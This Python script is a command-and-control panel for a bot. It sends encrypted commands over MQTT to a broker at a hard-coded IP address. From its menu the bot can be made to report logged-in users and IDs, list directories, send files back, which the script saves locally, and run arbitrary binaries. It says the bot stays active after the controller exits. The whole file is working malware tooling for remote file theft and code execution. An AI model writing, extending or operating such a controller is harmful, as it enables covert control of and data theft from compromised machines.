import paho.mqtt.client as mqtt
import time
import base64
import sys  
from security import SecureComm
from cryptography.fernet import InvalidToken

BROKER = "147.32.82.209"
PORT = 1883
TOPIC = "sensors"

crypto = SecureComm()

def on_message(client, userdata, msg):
    try:
        decrypted_raw = crypto.decrypt(msg.payload)
        
        # Only process if it is a Response (R:)
        if decrypted_raw.startswith("R:"):
            decrypted_msg = decrypted_raw[2:]
            
            if decrypted_msg.startswith("FILE_DATA:"):
                parts = decrypted_msg.split(":", 2)
                if len(parts) == 3:
                    _, filename, b64_data = parts
                    with open(f"downloaded_{filename}", "wb") as f:
                        f.write(base64.b64decode(b64_data))
                    print(f"\n[✔] File saved as: downloaded_{filename}")
            else:
                print(f"\n--- Response ---\n{decrypted_msg}\n----------------")
                
    except (InvalidToken, Exception):
        # Silently ignore noise from the public broker
        pass

client = mqtt.Client("Admin_Controller")
client.on_message = on_message
client.connect(BROKER, PORT)
client.subscribe(TOPIC)
client.loop_start()

def send_cmd(cmd_text):
    # Send command with prefix C:
    client.publish(TOPIC, crypto.encrypt(f"C:{cmd_text}"))

try:
    while True:
        print("\n--- Control Panel ---")
        print("1. Ping the bot | 2. Users currently logged in | 3. User´s ID | 4. List Dir | 5. Get File | 6. Exec Binary | 7. Exit")
        choice = input("Select: ")

        if choice == '1': send_cmd("PING")
        elif choice == '2': send_cmd("GET_USERS")
        elif choice == '3': send_cmd("GET_ID")
        elif choice == '4':
            path = input("Path: ")
            send_cmd(f"LS:{path}")
        elif choice == '5':
            path = input("File path: ")
            send_cmd(f"GET_FILE:{path}")
        elif choice == '6':
            bin_path = input("Full binary path: ")
            send_cmd(f"EXEC:{bin_path}")
        elif choice == '7': 
            print("[*] Shutting down controller. The bot remains active.")
            break
        
        time.sleep(1.0)
except KeyboardInterrupt:
    pass
finally:
    # Cleanup and exit
    client.loop_stop()
    client.disconnect()
    sys.exit(0)